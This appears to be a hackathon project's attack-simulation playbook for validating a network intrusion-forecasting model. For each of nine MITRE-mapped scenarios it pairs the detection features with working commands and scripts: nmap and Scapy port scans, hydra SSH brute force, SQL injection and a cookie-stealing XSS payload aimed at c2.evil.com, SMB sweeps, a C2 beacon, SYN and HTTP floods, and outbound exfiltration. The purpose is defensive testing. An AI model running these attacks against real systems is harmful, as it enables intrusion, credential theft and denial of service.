# Project Garud — Attack Simulation & Detection Guide
### Step-by-Step Practical Playbook for Validating Deep World Model Telemetry
**Smart India Hackathon 2026 — Problem Statement ID 26153 (NTRO) • Team Code 4 Change**

---

## Overview

This document provides a comprehensive, step-by-step guide to simulating **every attack category** that **Project Garud** is trained to forecast and detect. For each attack, this guide explains:
1. **The Attack Objective & MITRE ATT&CK Mapping**
2. **Exact Execution Commands** (using standard industry penetration testing tools: `nmap`, `hydra`, `curl`, `hping3`, `scapy`, and Python scripts, as well as the built-in synthetic generator)
3. **Why this specific command is used** (underlying protocol mechanics, packet flags, and timing)
4. **How NetForecast detects and forecasts it** (which of the 22 flow features shift, how the recurrent LSTM model catches the temporal sequence, and which MITRE stage is triggered).

---

## Table of Attack Scenarios

| Attack ID | Attack Name | MITRE Stage | Target ATT&CK Technique | Primary Detection Signals |
|:---:|:---|:---:|:---|:---|
| **SC-01** | [TCP SYN Stealth Port Scan](#scenario-1-tcp-syn-stealth-port-scan-reconnaissance) | Reconnaissance | T1595.001 (Active Scanning) | High `syn_flag_cnt`, elevated `rst_flag_cnt`, high `flow_pkts_s`, low `flow_duration` |
| **SC-02** | [Aggressive Service & Version Sweep](#scenario-2-aggressive-service--version-sweep-reconnaissance) | Reconnaissance | T1046 (Network Service Discovery) | High packet rate, rapid succession `flow_iat_mean`, high `syn_flag_cnt` |
| **SC-03** | [SSH / FTP Credential Brute Force](#scenario-3-ssh--ftp-credential-brute-force-initial-access) | Initial Access | T1110.001 (Password Guessing) | Repetitive bursts, high `psh_flag_cnt`, high `retransmit_cnt`, high `tot_fwd_pkts` |
| **SC-04** | [Web Application Exploitation (SQLi / XSS)](#scenario-4-web-application-exploitation-sqli--xss-initial-access) | Initial Access | T1190 (Exploit Public-Facing App) | Asymmetric forward payload `fwd_pkt_len_mean`, high `psh_flag_cnt`, moderate `flow_duration` |
| **SC-05** | [Internal Subnet Pivot & SMB Probe](#scenario-5-internal-subnet-pivot--smb-probe-lateral-movement) | Lateral Movement | T1021.002 (SMB/Windows Admin Shares) | East-West IP routing, high `down_up_ratio`, large bidirectional packet sizes |
| **SC-06** | [Periodic C2 Beaconing & Heartbeats](#scenario-6-periodic-command--control-c2-beaconing) | Command & Control | T1071.001 (Web Protocols) | Ultra-regular `flow_iat_mean` with low `flow_iat_std`, long `flow_duration`, high `ack_flag_cnt` |
| **SC-07** | [Volumetric DoS / Application Flooding](#scenario-7-volumetric-dos--application-flooding-command--control) | Command & Control | T1498 (Network Denial of Service) | Massive `flow_bytes_s`, spike in `tot_fwd_pkts`, low `flow_iat_mean`, high `flow_pkts_s` |
| **SC-08** | [Bulk Data Exfiltration over Egress](#scenario-8-bulk-data-exfiltration-over-egress-exfiltration) | Exfiltration | T1041 (Exfiltration Over C2 Channel) | Inverted `down_up_ratio < 0.2`, massive `bwd_pkt_len_mean`, high `flow_bytes_s`, high `pkt_size_avg` |
| **SC-09** | [Full Multi-Stage Kill Chain (Lab Simulator)](#scenario-9-full-multi-stage-kill-chain-synthetic-lab) | Multi-Stage (1 → 6) | Full MITRE ATT&CK Matrix | Progressive trajectory rollout across all 6 stages with Monte Carlo confidence |

---

## Scenario 1: TCP SYN Stealth Port Scan (Reconnaissance)

### 1. Objective & ATT&CK Mapping
- **MITRE ATT&CK:** [T1595.001 (Active Scanning: Scanning IP Blocks)](https://attack.mitre.org/techniques/T1595/001/)
- **CIC-IDS2017 Label:** `PortScan`
- **Goal:** Adversary attempts to identify open ports without completing the 3-way TCP handshake (half-open scanning), evading traditional application-level logging.

### 2. Execution Commands

#### Option A: Using Nmap (Standard Kali/Linux/Windows Command)
```bash
# -sS: TCP SYN half-open scan
# -T4: Aggressive timing (fast packet succession)
# -p 1-1000: Scan top 1000 ports
# <target-ip>: Target machine running on the monitored subnet
nmap -sS -T4 -p 1-1000 <target-ip>
```

#### Option B: Using Python & Scapy (No external tools required)
Save as `run_syn_scan.py` and run with elevated privileges:
```python
import sys
from scapy.all import IP, TCP, sr1

target_ip = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
target_ports = [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 1433, 3306, 3389, 8000, 8080]

print(f"[*] Launching SYN scan against {target_ip}...")
for port in target_ports:
    pkt = IP(dst=target_ip) / TCP(dport=port, flags="S")
    resp = sr1(pkt, timeout=0.5, verbose=0)
    if resp and resp.haslayer(TCP):
        if resp.getlayer(TCP).flags == 0x12: # SYN-ACK
            print(f"  [+] Port {port}: OPEN (SYN-ACK received)")
        elif resp.getlayer(TCP).flags == 0x14: # RST-ACK
            print(f"  [-] Port {port}: CLOSED (RST received)")
```
```powershell
python run_syn_scan.py 192.168.1.50
```

### 3. Why did we use this command?
- `-sS` sends raw TCP packets with only the `SYN` flag asserted.
- If a port is open, the target replies with `SYN-ACK`. The scanner immediately tears it down with an `RST` instead of sending an `ACK`, preventing the target OS from logging an established connection.
- If a port is closed, the target responds with an `RST-ACK`.

### 4. How NetForecast Detects & Forecasts It
- **Telemetry Feature Shifts:**
  - `syn_flag_cnt`: Jumps significantly above benign baseline ($\mu \approx 8.0$ vs normal $\approx 1.0$).
  - `rst_flag_cnt`: High number of RST packets returned from closed ports.
  - `flow_pkts_s`: Surges to 80+ pkts/s due to rapid probing.
  - `flow_duration`: Very low (< 1,000 $\mu$s per probe flow).
  - `flow_iat_mean`: Drops dramatically (< 1,000 $\mu$s between probes).
- **Model Inference:**
  - The recurrent LSTM window $W_t$ detects the high frequency of half-open attempts.
  - Infiltration probability $P(\text{Infiltration})$ rises to **0.75 – 0.88**.
  - Predicted MITRE Stage: **`Reconnaissance`**.
  - The forecast rollout anticipates the attacker will transition into **`Initial Access`** within the next 2–3 time steps.

---

## Scenario 2: Aggressive Service & Version Sweep (Reconnaissance)

### 1. Objective & ATT&CK Mapping
- **MITRE ATT&CK:** [T1046 (Network Service Discovery)](https://attack.mitre.org/techniques/T1046/)
- **CIC-IDS2017 Label:** `Botnet Probing / PortScan`
- **Goal:** Adversary conducts full TCP handshakes and sends application-level banners to identify vulnerable server versions (e.g., Apache, OpenSSH, MySQL).

### 2. Execution Commands
```bash
# -sV: Probe open ports to determine service/version info
# -sC: Run default nmap vulnerability/discovery scripts
# -Pn: Treat target as online (skip ping)
nmap -sV -sC -Pn -p 80,443,8000,8080 <target-ip>
```

### 3. Why did we use this command?
- Unlike SYN scans, version detection establishes full TCP connections and exchanges multiple application-layer payload probes (HTTP GET, SSL Client Hello, SSH negotiation banners).

### 4. How NetForecast Detects & Forecasts It
- **Telemetry Feature Shifts:**
  - `tot_fwd_pkts` & `tot_bwd_pkts`: Elevate to 10–20 packets per flow.
  - `psh_flag_cnt`: Increases as application payloads are pushed.
  - `flow_iat_std`: High variance as the scanner waits for banner responses.
- **Model Inference:**
  - $P(\text{Infiltration})$ crosses the adaptive threshold ($\theta_{\text{adaptive}}$).
  - Stage classification: **`Reconnaissance`** with transition confidence toward **`Initial Access`**.

---

## Scenario 3: SSH / FTP Credential Brute Force (Initial Access)

### 1. Objective & ATT&CK Mapping
- **MITRE ATT&CK:** [T1110.001 (Brute Force: Password Guessing)](https://attack.mitre.org/techniques/T1110/001/)
- **CIC-IDS2017 Label:** `SSH-Patator / FTP-Patator`
- **Goal:** Adversary attempts to gain unauthorized initial access by systematically cycling through dictionary credentials against SSH (port 22) or FTP (port 21).

### 2. Execution Commands

#### Option A: Using Hydra
```bash
# -l: Username to target
# -P: Wordlist of passwords
# -t 4: 4 parallel threads
# ssh://<target-ip>: Target service
hydra -l admin -P passwords.txt -t 4 ssh://<target-ip>
```

#### Option B: Using a Python Socket Script (Pure Python, Cross-Platform)
Save as `simulate_bruteforce.py`:
```python
import socket
import time
import sys

target_ip = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 22

passwords = ["123456", "password", "admin123", "root", "toor", "guest", "welcome", "letmein"]

print(f"[*] Simulating credential brute force against {target_ip}:{port}...")
for pwd in passwords:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        s.connect((target_ip, port))
        # Send SSH banner / auth attempt
        s.sendall(f"SSH-2.0-OpenSSH_8.2p1\r\nUser: admin Pass: {pwd}\r\n".encode())
        time.sleep(0.1)
        s.close()
        print(f"  [-] Attempted password '{pwd}'")
    except Exception as e:
        print(f"  [-] Connection reset: {e}")
    time.sleep(0.2)
```
```powershell
python simulate_bruteforce.py 192.168.1.50 22
```

### 3. Why did we use this command?
- Brute forcing creates a rapid sequence of repeated connection attempts to a single destination port, each with authentication payloads that fail and disconnect.
- It produces repeated TCP handshakes followed by immediate teardowns.

### 4. How NetForecast Detects & Forecasts It
- **Telemetry Feature Shifts:**
  - `tot_fwd_pkts`: 50+ packets across attempts in quick succession.
  - `psh_flag_cnt`: Spikes ($\mu \approx 8.0$) due to payload delivery on each attempt.
  - `retransmit_cnt`: High ($\mu \approx 5.0$) as the server rejects authentication attempts or rate limits.
  - `fwd_pkt_len_mean`: Consistent, structured authentication payload size (300–400 bytes).
- **Model Inference:**
  - Infiltration risk $P(\text{Infiltration})$ spikes to **0.85 – 0.94**.
  - Predicted MITRE Stage: **`Initial Access`**.
  - Forecaster warns of imminent **`Lateral Movement`** or **`Command & Control`** establishment.

---

## Scenario 4: Web Application Exploitation (SQLi / XSS) (Initial Access)

### 1. Objective & ATT&CK Mapping
- **MITRE ATT&CK:** [T1190 (Exploit Public-Facing Application)](https://attack.mitre.org/techniques/T1190/)
- **CIC-IDS2017 Label:** `Web Attack - SQL Injection / Web Attack - XSS`
- **Goal:** Adversary injects malicious SQL or script payloads into HTTP GET/POST parameters to extract database data or execute arbitrary commands.

### 2. Execution Commands

#### Option A: Using Curl (Direct Injection Payloads)
```bash
# SQL Injection attempt in URL query parameter:
curl -i -s -k "http://<target-ip>:8000/search?q=%27%20UNION%20SELECT%20null,username,password%20FROM%20users--"

# XSS Payload in POST body:
curl -i -s -k -X POST "http://<target-ip>:8000/comments" \
  -H "Content-Type: application/json" \
  -d '{"author": "attacker", "comment": "<script>document.location=\"http://c2.evil.com/steal?cookie=\"+document.cookie</script>"}'
```

#### Option B: Using SQLMap (Automated Detection & Exploitation)
```bash
sqlmap -u "http://<target-ip>:8000/api/item?id=1" --batch --dbs --threads=2
```

### 3. Why did we use this command?
- Malicious web requests carry significantly larger forward payload lengths than typical GET requests (due to complex SQL keywords, stacked queries, or encoded JavaScript tags).
- Automated tools like `sqlmap` test dozens of boundary characters and boolean conditions in rapid succession.

### 4. How NetForecast Detects & Forecasts It
- **Telemetry Feature Shifts:**
  - `fwd_pkt_len_mean`: Spikes significantly (large malicious URL or body).
  - `psh_flag_cnt`: High (payloads forced immediately to the application layer).
  - `flow_duration`: Moderate (30–60 ms) as server processes database queries.
  - `down_up_ratio`: Fluctuates depending on whether data is returned or error responses occur.
- **Model Inference:**
  - $P(\text{Infiltration})$ rises to **0.82 – 0.92**.
  - Predicted MITRE Stage: **`Initial Access`**.

---

## Scenario 5: Internal Subnet Pivot & SMB Probe (Lateral Movement)

### 1. Objective & ATT&CK Mapping
- **MITRE ATT&CK:** [T1021.002 (Remote Services: SMB/Windows Admin Shares)](https://attack.mitre.org/techniques/T1021/002/)
- **CIC-IDS2017 Label:** `Infiltration`
- **Goal:** Having compromised an initial host, the attacker seeks to move laterally to domain controllers, file servers, or database instances across internal RFC1918 subnets.

### 2. Execution Commands

#### Option A: Using PowerShell (Native Windows Lateral Sweep)
```powershell
# Sweep internal subnet for open SMB (445) and RDP (3389)
1..254 | ForEach-Object {
    $ip = "192.168.1.$_"
    Test-NetConnection -ComputerName $ip -Port 445 -InformationLevel Quiet | Out-Null
    Test-NetConnection -ComputerName $ip -Port 3389 -InformationLevel Quiet | Out-Null
}
```

#### Option B: SMB Enumeration with CrackMapExec / Nmap
```bash
# Check SMB credentials and admin shares across subnet
nmap -p 445 --script smb-os-discovery,smb-enum-shares 192.168.1.0/24
```

### 3. Why did we use this command?
- Lateral movement involves East-West traffic between internal IP addresses (e.g., `192.168.1.100` $\to$ `192.168.1.150`), rather than North-South perimeter traffic.
- SMB sessions exchange large negotiation headers and NTLM/Kerberos tickets.

### 4. How NetForecast Detects & Forecasts It
- **Telemetry Feature Shifts:**
  - Source/Destination IPs: Both are private/internal addresses.
  - `down_up_ratio`: High ($\mu \approx 3.0$) as the pivot host requests directory listings and credentials.
  - `fwd_pkt_len_mean` & `bwd_pkt_len_mean`: High (400–500 bytes) due to binary SMB structures.
  - `ack_flag_cnt`: High ($\mu \approx 20$) as large chunks of data are acknowledged.
- **Model Inference:**
  - Predicted MITRE Stage: **`Lateral Movement`**.
  - Infiltration risk stays persistently high (> 0.88).
  - The model forecasts that the next phase will be **`C2`** or **`Exfiltration`**.

---

## Scenario 6: Periodic Command & Control (C2) Beaconing

### 1. Objective & ATT&CK Mapping
- **MITRE ATT&CK:** [T1071.001 (Application Layer Protocol: Web Protocols)](https://attack.mitre.org/techniques/T1071/001/)
- **CIC-IDS2017 Label:** `Bot / C2`
- **Goal:** An implanted malware agent communicates back to the attacker's Command and Control server at fixed intervals to receive instructions (tasking) and report alive status (heartbeat).

### 2. Execution Commands

Save as `c2_beacon.py` and run:
```python
import urllib.request
import time
import sys

c2_url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000/health"
interval = 5.0 # 5-second periodic heartbeat

print(f"[*] Starting C2 beaconing to {c2_url} every {interval}s...")
while True:
    try:
        req = urllib.request.Request(
            c2_url,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) C2Client/1.0"}
        )
        start = time.time()
        with urllib.request.urlopen(req, timeout=3) as resp:
            data = resp.read()
            elapsed = time.time() - start
            print(f"  [+] Beacon sent at {time.strftime('%X')}: HTTP {resp.status}, {len(data)} bytes ({elapsed*1000:.1f}ms)")
    except Exception as e:
        print(f"  [-] Beacon failed: {e}")
    time.sleep(interval)
```
```powershell
python c2_beacon.py http://192.168.1.50:8000/health
```

### 3. Why did we use this command?
- C2 beacons produce a low-bandwidth, highly consistent temporal heartbeat.
- Unlike human web browsing which has bursty and chaotic inter-arrival times (IAT), automated beaconing exhibits **near-zero standard deviation** in IAT.

### 4. How NetForecast Detects & Forecasts It
- **Telemetry Feature Shifts:**
  - `flow_iat_mean`: High (reflects the beacon interval, e.g. 5,000,000 $\mu$s).
  - `flow_iat_std`: **Extremely low** ($\mu \approx 5,000$ vs normal $\approx 30,000$), exposing mechanical periodicity.
  - `flow_bytes_s`: Low (< 1,000 bytes/s) because only small status tokens are exchanged.
  - `flow_duration`: Long-lived connection or regular recurring flow pattern.
- **Model Inference:**
  - SHAP feature attributions show `flow_iat_std` and `flow_iat_mean` as the dominant drivers pushing risk upward.
  - Predicted MITRE Stage: **`C2`**.
  - Next-step forecast projects a transition to **`Exfiltration`** if the session is left uncontained.

---

## Scenario 7: Volumetric DoS / Application Flooding (Command & Control)

### 1. Objective & ATT&CK Mapping
- **MITRE ATT&CK:** [T1498 (Network Denial of Service)](https://attack.mitre.org/techniques/T1498/)
- **CIC-IDS2017 Label:** `DDoS LOIC / DoS Hulk / DoS GoldenEye`
- **Goal:** Attacker overwhelms target service bandwidth or CPU resources with high-rate TCP/HTTP packet floods, denying availability to legitimate users.

### 2. Execution Commands

#### Option A: Using Hping3 (SYN Flood / TCP Flood)
```bash
# -S: SYN flag
# -p 8000: Target port
# --flood: Send packets as fast as possible without waiting for reply
hping3 -S -p 8000 --flood <target-ip>
```

#### Option B: Using Python Multi-Threaded HTTP Flood
Save as `http_flood.py`:
```python
import threading
import urllib.request
import sys

target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000/"
num_threads = 10

def flood():
    while True:
        try:
            req = urllib.request.Request(target, headers={"User-Agent": "DoS-Bot/1.0"})
            with urllib.request.urlopen(req, timeout=1) as resp:
                pass
        except Exception:
            pass

print(f"[*] Launching HTTP flood against {target} with {num_threads} threads...")
threads = [threading.Thread(target=flood, daemon=True) for _ in range(num_threads)]
for t in threads:
    t.start()

try:
    for t in threads:
        t.join()
except KeyboardInterrupt:
    print("\n[*] Flood stopped.")
```
```powershell
python http_flood.py http://192.168.1.50:8000/
```

### 3. Why did we use this command?
- Flooding saturates the connection buffer with packets sent in minimal inter-arrival time without completing teardowns.

### 4. How NetForecast Detects & Forecasts It
- **Telemetry Feature Shifts:**
  - `flow_bytes_s`: Massive spike (order of magnitude increase).
  - `flow_pkts_s`: Massive surge (100–1000x normal baseline).
  - `tot_fwd_pkts`: Rapid accumulation.
  - `flow_iat_mean`: Drops to near zero.
- **Model Inference:**
  - $P(\text{Infiltration})$ spikes immediately to **0.95+**.
  - Adaptive threshold triggers a **CRITICAL** severity alert within the sliding window.

---

## Scenario 8: Bulk Data Exfiltration over Egress (Exfiltration)

### 1. Objective & ATT&CK Mapping
- **MITRE ATT&CK:** [T1041 (Exfiltration Over C2 Channel)](https://attack.mitre.org/techniques/T1041/)
- **CIC-IDS2017 Label:** `Heartbleed / Exfiltration`
- **Goal:** Adversary steals confidential databases, documents, or credentials by streaming them outbound from an internal server to an external listener.

### 2. Execution Commands

#### Option A: Large File Upload via Curl
```bash
# Generate a 50MB random binary test file:
fsutil file createnew test_data.bin 52428800

# Stream outbound to remote endpoint:
curl -X POST "http://<external-c2-ip>:8000/upload" \
  -H "Content-Type: application/octet-stream" \
  --data-binary "@test_data.bin"
```

#### Option B: Raw TCP Socket Exfiltration
Save as `simulate_exfil.py`:
```python
import socket
import os
import sys

target_ip = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 9999

# Generate 5MB of synthetic data
payload = os.urandom(5 * 1024 * 1024)

print(f"[*] Simulating bulk exfiltration of {len(payload)/(1024*1024):.1f} MB to {target_ip}:{target_port}...")
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.sendall(payload)
    s.close()
    print("  [+] Exfiltration stream completed.")
except Exception as e:
    print(f"  [-] Connection error: {e}")
```

### 3. Why did we use this command?
- Normal enterprise web traffic is downstream-heavy (downloading web pages, viewing media $\to$ `down_up_ratio` > 1.0).
- Exfiltration reverses this pattern: huge volumes of outbound data leave the network with minimal return traffic (`down_up_ratio` < 0.2).

### 4. How NetForecast Detects & Forecasts It
- **Telemetry Feature Shifts:**
  - `bwd_pkt_len_mean`: Spikes to maximum MTU (~1,200–1,500 bytes) as packets are packed to capacity.
  - `flow_bytes_s`: Spikes to 50,000+ bytes/s.
  - `down_up_ratio`: Drops to **0.1 – 0.2** (strongly inverted ratio).
  - `pkt_size_avg`: Increases to 1,100+ bytes.
- **Model Inference:**
  - Predicted MITRE Stage: **`Exfiltration`** (Final stage of the kill chain).
  - SOC Dashboard raises a **CRITICAL** data theft alert.
  - Feature attribution radar highlights `down_up_ratio` and `bwd_pkt_len_mean` as primary indicators.

---

## Scenario 9: Full Multi-Stage Kill Chain (Synthetic Lab)

If you do not have an isolated penetration testing network or want to demonstrate the full end-to-end forecasting pipeline without generating real packets, NetForecast provides a **built-in Kill-Chain Simulator**.

### 1. How the Simulator Works
The simulator (`demo/traffic_simulator.py`) generates feature vectors following the statistical distributions observed in **CIC-IDS2017/2018** for each MITRE stage:
$$\text{Benign} \longrightarrow \text{Reconnaissance} \longrightarrow \text{Initial Access} \longrightarrow \text{Lateral Movement} \longrightarrow \text{C2} \longrightarrow \text{Exfiltration}$$

### 2. Execution Steps

#### Step 1: Switch Mode to Simulated
In the NetForecast Dashboard:
1. Navigate to **SETTINGS** in the navigation bar.
2. Under `TRAFFIC_SOURCE_MODE`, click `SIMULATED`.
*(Or via API: `curl -X POST http://localhost:8000/system/mode -H "Content-Type: application/json" -d '{"mode":"simulated"}'`)*

#### Step 2: Launch the Simulator
Run the simulator from the repository root:
```powershell
& "backend\venv\Scripts\python.exe" demo\traffic_simulator.py --api http://localhost:8000 --sessions 4 --speed 1.0
```

#### Step 3: Observe Real-Time Forecasting in Dashboard
1. **Live Matrix & Sessions View:**
   - Watch sessions evolve across source/destination IP pairs.
   - Attack sessions will progressively advance from green (`Benign`) to orange (`Reconnaissance`, `Initial Access`) and red (`C2`, `Exfiltration`).
2. **Forecast View (`/forecast`):**
   - Click on any active attack session.
   - Observe the **Monte Carlo 6-Step Lookahead** chart with shaded 95% confidence bands showing the projected risk trajectory.
   - Click `VIEW REPORT` to generate an interactive printable forecast dossier.
3. **Explainability View (`/explain`):**
   - Click on the session to view real-time **SHAP** and **Gradient $\times$ Input** attributions.
   - Identify exactly which of the 22 features (e.g. `syn_flag_cnt`, `flow_iat_mean`, `down_up_ratio`) triggered the alert.
   - Click `EXPORT HTML` to save the forensic dossier.
4. **Forensic Reports View (`/reports`):**
   - Open **REPORTS** to view the incident summary.
   - Click `VIEW REPORT` to open the full forensic dossier formatted in the NetForecast retro-futuristic SOC palette.
   - Click `EXPORT FORENSIC HTML`, `CSV`, or `JSON` for external SIEM integration.

#### Step 4: Return to Live Mode
When finished testing:
1. Stop the simulator (`Ctrl+C` in terminal).
2. In **SETTINGS**, click `PURGE ALL SIMULATED DATA` to clean up the database.
3. Click `LIVE ONLY` to lock the system back to genuine live network packet capture.

---

## Summary of Feature Attribution Signatures

| MITRE ATT&CK Stage | Primary Driving Features | Secondary Driving Features | Typical Attacker Intent |
|---|---|---|---|
| **Reconnaissance** | `syn_flag_cnt` (+), `flow_pkts_s` (+) | `rst_flag_cnt` (+), `flow_duration` (-) | Discovering live hosts and open ports |
| **Initial Access** | `psh_flag_cnt` (+), `tot_fwd_pkts` (+) | `retransmit_cnt` (+), `fwd_pkt_len_mean` (+) | Password brute force, exploit payload delivery |
| **Lateral Movement** | `down_up_ratio` (+), `ack_flag_cnt` (+) | `fwd_pkt_len_mean` (+), `bwd_pkt_len_mean` (+) | Internal SMB/RDP scanning, ticket extraction |
| **Command & Control** | `flow_iat_std` (-), `flow_iat_mean` (+) | `flow_duration` (+), `ack_flag_cnt` (+) | Heartbeats, beaconing, long-lived listener sessions |
| **Exfiltration** | `bwd_pkt_len_mean` (+), `flow_bytes_s` (+) | `down_up_ratio` (-), `pkt_size_avg` (+) | High-volume outbound data staging & theft |

---

<div align="center">
  <sub>NetForecast Attack Simulation Specification • Smart India Hackathon 2026 • Problem Statement ID 26153</sub>
</div>
